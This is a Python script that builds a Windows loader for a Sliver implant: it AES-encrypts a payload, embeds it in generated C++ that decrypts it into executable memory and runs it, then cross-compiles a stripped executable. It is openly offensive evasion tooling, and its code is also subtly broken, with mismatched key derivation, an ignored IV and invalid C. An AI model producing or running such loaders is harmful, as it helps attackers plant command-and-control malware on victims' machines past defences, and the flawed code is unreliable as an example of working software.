import os
import sys
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad

def encrypt_payload(payload_path):
    with open(payload_path, 'rb') as f:
        payload = f.read()
    key = os.urandom(32)
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_payload = cipher.encrypt(pad(payload, AES.block_size))
    return encrypted_payload, key, iv

def create_loader(encrypted_payload, key, iv):
    loader_template = f"""
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

unsigned char payload[] = {{{', '.join(f'0x{b:02x}' for b in encrypted_payload)}}};
unsigned char key[] = {{{', '.join(f'0x{b:02x}' for b in key)}}};
unsigned char iv[] = {{{', '.join(f'0x{b:02x}' for b in iv)}}}};

void XOR(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {{
    for (size_t i = 0; i < data_len; i++) {{
        data[i] ^= key[i % key_len];
    }}
}}

int main() {{
    // Decrypt payload
    unsigned char decrypted[sizeof(payload)];
    memcpy(decrypted, payload, sizeof(payload));

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
        return 1;
    }}
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
        CryptReleaseContext(hProv, 0);
        return 1;
    }}
    if (!CryptHashData(hHash, key, sizeof(key), 0)) {{
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 1;
    }}
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {{
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 1;
    }}

    if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted, &sizeof(payload))) {{
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 1;
    }}

    // Allocate memory and execute
    void* exec_mem = VirtualAlloc(0, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, decrypted, sizeof(decrypted));
    ((void(*)())exec_mem)();

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return 0;
}}
"""
    with open("loader.cpp", "w") as f:
        f.write(loader_template)

def compile_loader():
    compile_command = [
        "x86_64-w64-mingw32-g++",
        "-static",
        "-Os",
        "-fno-exceptions",
        "-fno-rtti",
        "-s",
        "-ffunction-sections",
        "-fdata-sections",
        "-Wl,--gc-sections",
        "-o", "loader.exe",
        "loader.cpp",
        "-ladvapi32",
        "-lcrypt32"
    ]
    result = subprocess.run(compile_command, capture_output=True, text=True)
    if result.returncode != 0:
        print("===== COMPILATION ERROR =====")
        print(f"Command: {' '.join(compile_command)}")
        print(f"Return Code: {result.returncode}")
        print(f"STDOUT:\n{result.stdout}")
        print(f"STDERR:\n{result.stderr}")
        sys.exit(1)

def main():
    if len(sys.argv) != 3 or sys.argv[1] != "sliver":
        print("Usage: python3 theloader.py sliver <payload.exe>")
        sys.exit(1)

    payload_path = sys.argv[2]
    encrypted_payload, key, iv = encrypt_payload(payload_path)
    create_loader(encrypted_payload, key, iv)
    compile_loader()
    print("[+] loader.exe generated successfully.")

if __name__ == "__main__":
    main()
